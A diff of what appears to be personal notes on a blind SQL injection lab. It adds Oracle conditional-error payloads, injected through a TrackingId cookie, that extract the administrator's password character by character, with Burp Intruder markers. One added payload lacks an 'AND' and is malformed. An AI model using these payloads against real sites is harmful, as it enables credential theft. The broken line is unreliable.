@@ -268,3 +268,9 @@ GIVEN : The database contains a different table called users, with columns calle
 
     1.Find the length of password:
     TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(PASSWORD)>$1$)||'   : ERROR -> IT'S OK
+
+
+   TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' SUBSTR(password,1,1)='§a§')||'
+   
+
+   TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
